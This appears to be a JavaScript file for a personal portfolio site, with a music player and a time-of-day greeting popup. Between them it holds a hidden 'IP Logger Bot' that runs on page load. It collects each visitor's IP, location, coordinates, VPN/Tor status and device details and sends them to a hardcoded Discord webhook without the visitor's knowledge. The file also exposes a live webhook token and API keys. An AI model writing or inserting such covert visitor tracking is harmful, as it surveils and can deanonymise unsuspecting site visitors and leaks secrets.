// Toggle Add Music Form
//function toggleAddMusicForm() {
//    const form = document.getElementById('addMusicForm');
//    form.style.display = form.style.display === 'none' ? 'block' : 'none';
//}

// Add New Music
//function addNewMusic() {
//    // Get form values
//    const title = document.getElementById('songTitle').value;
//    const artist = document.getElementById('artist').value;
//    const album = document.getElementById('album').value;
//    const duration = document.getElementById('duration').value;
//    const coverUrl = document.getElementById('coverUrl').value || './images/cas.png'; 
//
//    // Find the artist section or create new one
//    let artistSection = findOrCreateArtistSection(artist);
//    
//    // Get the song grid
//    const songGrid = artistSection.querySelector('.song-grid');
//    
//    // Get the current number of songs
//    const songCount = songGrid.querySelectorAll('.song-item').length;
//
//    // Create new song item
//    const songItem = createSongItem(songCount + 1, title, artist, album, duration, coverUrl);
//    
//    // Add the new song to the grid
//    songGrid.appendChild(songItem);
//
//    // Clear form and hide it
//    clearForm();
//    toggleAddMusicForm();
//}

// Find or Create Artist Section
//function findOrCreateArtistSection(artistName) {
//    let artistSection = Array.from(document.querySelectorAll('.artist-section')).find(section => 
//        section.querySelector('.favtext h1').textContent.trim() === artistName
//    );
//
//    if (!artistSection) {
//        // Create new artist section
//        artistSection = document.createElement('div');
//        artistSection.className = 'artist-section';
//        artistSection.innerHTML = `
//            <div class="favtext">
//                <h1>${artistName}</h1>
//                <b class="favdesc">Songs</b>
//            </div>
//            <div class="whiteline"></div>
//            <div class="song-grid"></div>
//        `;
//
//        // Add to artists container
//        document.querySelector('.artists-container').appendChild(artistSection);
//    }
//
//    return artistSection;
//}

// Create Song Item
//function createSongItem(number, title, artist, album, duration, coverUrl) {
//    const div = document.createElement('div');
//    div.className = 'song-item';
//    const songId = `song-${artist.replace(/\s+/g, '-')}-${title.replace(/\s+/g, '-')}`.toLowerCase();
//    div.innerHTML = `
//        <div class="song-number">${number}</div>
//        <div class="song-image-container">
//            <img src="${coverUrl}" alt="${title}" class="song-image"/>
//            <div class="play-button" onclick="playSong('${songId}')">
//                <i class="fa-solid fa-play"></i>
//            </div>
//        </div>
//        <div class="song-info">
//            <div class="song-name">${title}</div>
//            <div class="song-artist">${artist}</div>
//        </div>
//        <div class="song-album">${album}</div>
//        <div class="song-duration">${duration}</div>
//        <div class="music-visualizer">
//            <div class="music-bar"></div>
//            <div class="music-bar"></div>
//            <div class="music-bar"></div>
//            <div class="music-bar"></div>
//        </div>
//        <audio id="${songId}" src="musics/${artist}/${title}.mp3"></audio>
//    `;
//    return div;
//}

// Clear Form
//function clearForm() {
//    document.getElementById('songTitle').value = '';
//    document.getElementById('artist').value = '';
//    document.getElementById('album').value = '';
//    document.getElementById('duration').value = '';
//    document.getElementById('coverUrl').value = '';
//}

// Current playing audio element
let currentlyPlaying = null;
let isPlaying = false;

// Play individual song
function playSong(audioId, audioSrc) {
    const audioElement = document.getElementById(audioId);
    
    // If there's another song playing, stop it
    if (currentlyPlaying && currentlyPlaying !== audioElement) {
        currentlyPlaying.pause();
        currentlyPlaying.currentTime = 0;
        const oldSongItem = currentlyPlaying.closest('.song-item');
        if (oldSongItem) {
            oldSongItem.classList.remove('playing');
            const oldPlayButton = oldSongItem.querySelector('.play-button i');
            if (oldPlayButton) {
                oldPlayButton.className = 'fa-solid fa-play';
            }
        }
    }

    // If this song is already playing, pause it
    if (isPlaying && currentlyPlaying === audioElement) {
        audioElement.pause();
        isPlaying = false;
        const songItem = audioElement.closest('.song-item');
        const playButton = songItem.querySelector('.play-button');
        if (playButton) {
            playButton.classList.remove('playing');
            playButton.querySelector('i').className = 'fa-solid fa-play';
            // Remove any ongoing animations
            playButton.style.animation = 'none';
            // Force a reflow
            void playButton.offsetWidth;
            playButton.style.animation = '';
        }
        songItem.classList.remove('playing');
    } else {
        // Play the new song
        audioElement.play();
        isPlaying = true;
        currentlyPlaying = audioElement;
        const songItem = audioElement.closest('.song-item');
        const playButton = songItem.querySelector('.play-button');
        if (playButton) {
            playButton.classList.add('playing');
            playButton.querySelector('i').className = 'fa-solid fa-pause';
            // Reset any previous animation state
            playButton.style.animation = 'none';
            void playButton.offsetWidth;
            playButton.style.animation = '';
        }
        songItem.classList.add('playing');
    }

    // Update progress bar
    audioElement.ontimeupdate = function() {
        const songItem = this.closest('.song-item');
        if (songItem) {
            const progress = (this.currentTime / this.duration) * 100;
            songItem.style.setProperty('--progress', progress + '%');
        }
    };

    // When song ends
    audioElement.onended = function() {
        isPlaying = false;
        const songItem = this.closest('.song-item');
        if (songItem) {
            songItem.style.setProperty('--progress', '0%');
            const playButton = songItem.querySelector('.play-button');
            if (playButton) {
                playButton.classList.remove('playing');
                playButton.querySelector('i').className = 'fa-solid fa-play';
            }
            songItem.classList.remove('playing');
        }
    };
}

// Play all songs in a section
//function playAllSongs(artistId) {
//    const artistSection = document.querySelector(`[data-artist-id="${artistId}"]`);
//    if (!artistSection) return;
//
//    const audioElements = artistSection.querySelectorAll('audio');
//    let currentIndex = 0;
//
//    function playNext() {
//        if (currentIndex < audioElements.length) {
//            const audio = audioElements[currentIndex];
//            audio.play();
//            currentIndex++;
//            audio.onended = playNext;
//        }
//    }
//
//    playNext();
//}


//Webhook IP
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1397165010702172180/fEOUreMdx4Q7oGebxqlveBZOL4brnQ9VxpUIwwKysvTGeq70GHMWiTSuH4Hw0_Us5ppg';
const API_KEY = 'a4b4abd805edfe3e4e0e6a91f922efa4';

async function logVisitor() {
    try {
        // First, get the visitor's IP address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const visitorIP = ipData.ip;

        // Get detailed location information using the IP
        const locationResponse = await fetch(`https://iplocate.io/api/lookup/${visitorIP}?apikey=${API_KEY}`);
        const locationData = await locationResponse.json();

        // Get additional browser/device information
        const browserInfo = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'Direct Visit',
            currentPage: window.location.href
        };

        // Create Discord embed message
        const embed = {
            title: "🔍 New Website Visitor",
            color: 0x00ff00, // Green color
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: "📍 Location Information",
                    value: `**IP:** ${locationData.ip}\n**Country:** ${locationData.country} (${locationData.country_code})\n**City:** ${locationData.city || 'Unknown'}\n**Region:** ${locationData.subdivision || 'Unknown'}\n**Timezone:** ${locationData.time_zone || 'Unknown'}`,
                    inline: false
                },
                {
                    name: "🌐 Network Information",
                    value: `**ISP:** ${locationData.company?.name || 'Unknown'}\n**ASN:** ${locationData.asn?.asn || 'Unknown'}\n**Network:** ${locationData.network || 'Unknown'}`,
                    inline: false
                },
                {
                    name: "🔒 Security Flags",
                    value: `**VPN:** ${locationData.privacy?.is_vpn ? '✅' : '❌'}\n**Proxy:** ${locationData.privacy?.is_proxy ? '✅' : '❌'}\n**Tor:** ${locationData.privacy?.is_tor ? '✅' : '❌'}\n**Datacenter:** ${locationData.privacy?.is_datacenter ? '✅' : '❌'}`,
                    inline: true
                },
                {
                    name: "💻 Device Information",
                    value: `**Platform:** ${browserInfo.platform}\n**Language:** ${browserInfo.language}\n**Screen:** ${browserInfo.screenResolution}\n**Timezone:** ${browserInfo.timezone}`,
                    inline: true
                },
                {
                    name: "🌐 Browser Information",
                    value: `**User Agent:** ${browserInfo.userAgent.substring(0, 100)}...\n**Referrer:** ${browserInfo.referrer}\n**Page:** ${browserInfo.currentPage}`,
                    inline: false
                }
            ],
            footer: {
                text: "Portfolio",
                icon_url: "https://cdn.discordapp.com/emojis/849428697022193674.png"
            }
        };

        // Add coordinates if available
        if (locationData.latitude && locationData.longitude) {
            embed.fields.push({
                name: "🧭 Coordinates",
                value: `**Lat:** ${locationData.latitude}\n**Long:** ${locationData.longitude}\n[View on Map](https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude})`,
                inline: true
            });
        }

        // Send to Discord webhook
        const webhookData = {
            embeds: [embed],
            username: "IP Logger Bot",
            avatar_url: "https://cdn.discordapp.com/emojis/849428697022193674.png"
        };

        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(webhookData)
        });

        console.log('Visitor data logged successfully (Educational Purpose)');

    } catch (error) {
        console.error('Error logging visitor data:', error);
        
        // Send error notification to Discord
        try {
            const errorEmbed = {
                title: "❌ IP Logger Error",
                color: 0xff0000,
                description: `Error occurred while logging visitor: ${error.message}`,
                timestamp: new Date().toISOString()
            };

            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    embeds: [errorEmbed],
                    username: "IP Logger Bot"
                })
            });
        } catch (webhookError) {
            console.error('Failed to send error to Discord:', webhookError);
        }
    }
}

function shouldLogVisitor() {
    const lastLog = localStorage.getItem('lastIPLog');
    const now = Date.now();
    const oneHour = 60 * 60 * 1000; // 1 hour in milliseconds

    if (!lastLog || (now - parseInt(lastLog)) > oneHour) {
        localStorage.setItem('lastIPLog', now.toString());
        return true;
    }
    return false;
}

document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
        if (shouldLogVisitor()) {
            logVisitor();
        }
    }, 1000);
});

window.addEventListener('beforeunload', function() {
    console.log('User leaving page');
});

window.testIPLogger = logVisitor;

// Greeting messages arrays
const morningMessages = [
    "I hope you have a wonderful day ahead!",
    "May your morning be filled with joy and success!",
    "Start your day with a smile and positive energy!",
    "Wishing you a productive and amazing morning!",
    "Hope today brings you happiness and great opportunities!"
];

const afternoonMessages = [
    "Hope your afternoon is going smoothly!",
    "May the rest of your day be fantastic!",
    "Wishing you a pleasant and productive afternoon!",
    "Hope you're having a great day so far!",
    "May your afternoon be filled with positive vibes!"
];

const eveningMessages = [
    "Hope you're having a relaxing evening!",
    "Wishing you a peaceful and enjoyable evening!",
    "May your evening be filled with comfort and joy!",
    "Hope you can unwind and enjoy your evening!",
    "Wishing you a wonderful end to your day!"
];

// Session storage key for tracking visits (resets on browser close)
const VISIT_KEY = 'greeting_shown_session';

// Function to check if user is new (hasn't seen greeting this session)
function isNewVisitor() {
    const hasSeenGreeting = sessionStorage.getItem(VISIT_KEY);
    return !hasSeenGreeting;
}

// Function to mark user as visited
function markAsVisited() {
    sessionStorage.setItem(VISIT_KEY, 'true');
}

// Function to get random message based on time period
function getRandomMessage(messagesArray) {
    return messagesArray[Math.floor(Math.random() * messagesArray.length)];
}

// Function to determine greeting and message based on hour
function getGreetingContent(hour) {
    let greeting, message;
    
    if (hour >= 0 && hour < 12) {
        greeting = "Good Morning!";
        message = getRandomMessage(morningMessages);
    } else if (hour >= 12 && hour < 18) {
        greeting = "Good Afternoon!";
        message = getRandomMessage(afternoonMessages);
    } else {
        greeting = "Good Evening!";
        message = getRandomMessage(eveningMessages);
    }
    
    return { greeting, message };
}

// Function to format current date and time
function getCurrentDateTime() {
    const now = new Date();
    
    // Format date
    const options = { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric' 
    };
    const dateStr = now.toLocaleDateString('en-US', options);
    
    // Format time
    const timeStr = now.toLocaleTimeString('en-US', { 
        hour: '2-digit', 
        minute: '2-digit',
        hour12: true 
    });
    
    return { date: dateStr, time: timeStr };
}

// Function to create date/time footer
function createDateTimeFooter() {
    const greeting = document.querySelector('.greeting');
    if (!greeting) return;
    
    // Check if footer already exists
    let footer = greeting.querySelector('.datetime-footer');
    if (!footer) {
        footer = document.createElement('div');
        footer.className = 'datetime-footer';
        footer.style.cssText = `
            border-top: 1px solid rgba(255, 255, 255, 0.3);
            padding: 8px 0 0 0;
            margin-top: 15px;
            font-size: 11px;
            color: rgba(255, 255, 255, 0.8);
            text-align: center;
            line-height: 1.3;
        `;
        greeting.appendChild(footer);
    }
    
    const { date, time } = getCurrentDateTime();
    footer.innerHTML = `
        <div style="font-weight: bold;">${time}</div>
        <div style="margin-top: 2px;">${date}</div>
    `;
}

// Function to update greeting content
function updateGreetingContent(hour) {
    const { greeting, message } = getGreetingContent(hour);
    
    const greetingH1 = document.querySelector('.greeting h1');
    const greetingB = document.querySelector('.greeting b');
    
    if (greetingH1) greetingH1.textContent = greeting;
    if (greetingB) greetingB.textContent = message;
    
    // Add date/time footer
    createDateTimeFooter();
}

// Function to setup proper positioning and prevent width extension
function setupGreetingPosition() {
    const greetRight = document.querySelector('.greetright');
    if (!greetRight) return;
    
    // Apply fixed positioning and prevent overflow
    greetRight.style.position = 'fixed';
    greetRight.style.top = '80px';
    greetRight.style.right = '0px';
    greetRight.style.zIndex = '9999';
    greetRight.style.pointerEvents = 'auto';
    
    // Prevent body overflow during animations
    document.body.style.overflowX = 'hidden';
    
    // Ensure the greeting container doesn't extend viewport
    greetRight.style.maxWidth = '340px';
    greetRight.style.width = '340px';
    greetRight.style.boxSizing = 'border-box';
}

// Function to slide in from right
function slideInFromRight() {
    const greetRight = document.querySelector('.greetright');
    if (!greetRight) return;
    
    setupGreetingPosition();
    
    // Set initial position (hidden off-screen to the right)
    greetRight.style.transform = 'translateX(100%)';
    greetRight.style.opacity = '0';
    greetRight.style.display = 'block';
    greetRight.style.transition = 'transform 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94), opacity 0.6s ease-out';
    
    // Add subtle scale animation for better effect
    greetRight.style.transformOrigin = 'right center';
    
    // Trigger slide in animation
    setTimeout(() => {
        greetRight.style.transform = 'translateX(0) scale(1)';
        greetRight.style.opacity = '1';
    }, 100);
    
    // Add subtle hover effect
    greetRight.addEventListener('mouseenter', () => {
        greetRight.style.transform = 'translateX(0) scale(1.02)';
    });
    
    greetRight.addEventListener('mouseleave', () => {
        greetRight.style.transform = 'translateX(0) scale(1)';
    });
}

// Function to slide out to right
function slideOutToRight() {
    const greetRight = document.querySelector('.greetright');
    if (!greetRight) return;
    
    greetRight.style.transition = 'transform 0.5s cubic-bezier(0.55, 0.085, 0.68, 0.53), opacity 0.5s ease-out';
    greetRight.style.transform = 'translateX(100%) scale(0.95)';
    greetRight.style.opacity = '0';
    
    // Hide element after animation completes
    setTimeout(() => {
        greetRight.style.display = 'none';
        // Reset body overflow
        document.body.style.overflowX = '';
    }, 500);
}

// Function to add smooth pulsing animation
function addPulseAnimation() {
    const greeting = document.querySelector('.greeting');
    if (!greeting) return;
    
    greeting.style.animation = 'gentle-pulse 2s ease-in-out infinite alternate';
    
    // Add CSS animation if it doesn't exist
    if (!document.querySelector('#pulse-animation-style')) {
        const style = document.createElement('style');
        style.id = 'pulse-animation-style';
        style.textContent = `
            @keyframes gentle-pulse {
                0% { box-shadow: 0 0 20px rgba(255, 255, 255, 0.3); }
                100% { box-shadow: 0 0 30px rgba(255, 255, 255, 0.5); }
            }
            
            .greeting {
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
            
            .greeting:hover {
                transform: translateY(-2px);
                transition: transform 0.3s ease;
            }
        `;
        document.head.appendChild(style);
    }
}

// Function to fetch timezone data and show greeting
async function showGreeting() {
    // Check if user is new visitor first
    if (!isNewVisitor()) {
        return; // Don't show greeting if already shown today
    }
    
    try {
        const response = await fetch('https://api.ipgeolocation.io/v2/timezone?apiKey=7a256457de5f429ea4f1b6daaace8317&tz=Asia/Manila');
        const data = await response.json();
        
        // Parse the current time
        const currentTime = new Date(data.date_time);
        const currentHour = currentTime.getHours();
        
        // Update greeting content based on current hour
        updateGreetingContent(currentHour);
        
        // Add visual enhancements
        addPulseAnimation();
        
        // Show the greeting with slide-in animation
        slideInFromRight();
        
        // Mark user as visited
        markAsVisited();
        
        // Auto-hide after 5 seconds
        setTimeout(() => {
            slideOutToRight();
        }, 5000);
        
    } catch (error) {
        console.error('Error fetching timezone data:', error);
        
        // Fallback to local time if API fails
        const localTime = new Date();
        const localHour = localTime.getHours();
        updateGreetingContent(localHour);
        addPulseAnimation();
        slideInFromRight();
        markAsVisited();
        
        setTimeout(() => {
            slideOutToRight();
        }, 5000);
    }
}

// Function to handle close button (no animations)
function setupCloseButton() {
    const closeButton = document.querySelector('.close');
    if (closeButton) {
        closeButton.style.cursor = 'pointer';
        
        closeButton.addEventListener('click', () => {
            slideOutToRight();
        });
    }
}

// Function to add scroll-following behavior
function setupScrollFollowing() {
    let scrollTimer = null;
    
    window.addEventListener('scroll', () => {
        const greetRight = document.querySelector('.greetright');
        if (!greetRight || greetRight.style.display === 'none') return;
        
        // Clear previous timer
        if (scrollTimer !== null) {
            clearTimeout(scrollTimer);
        }
        
        // Add subtle movement during scroll
        greetRight.style.transition = 'transform 0.1s ease-out';
        
        // Reset position after scroll stops
        scrollTimer = setTimeout(() => {
            if (greetRight.style.display !== 'none') {
                greetRight.style.transition = 'transform 0.3s ease-out';
            }
        }, 150);
    });
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    // Hide the greeting initially
    const greetRight = document.querySelector('.greetright');
    if (greetRight) {
        greetRight.style.display = 'none';
    }
    
    // Setup all functionalities
    setupCloseButton();
    setupScrollFollowing();
    
    // Show greeting only for new visitors with a slight delay for better UX
    setTimeout(() => {
        showGreeting();
    }, 1000);
});

// Handle page visibility changes (but don't show greeting again)
document.addEventListener('visibilitychange', () => {
    if (!document.hidden) {
        // Only reposition if greeting is currently visible
        const greetRight = document.querySelector('.greetright');
        if (greetRight && greetRight.style.display !== 'none') {
            setupGreetingPosition();
        }
    }
});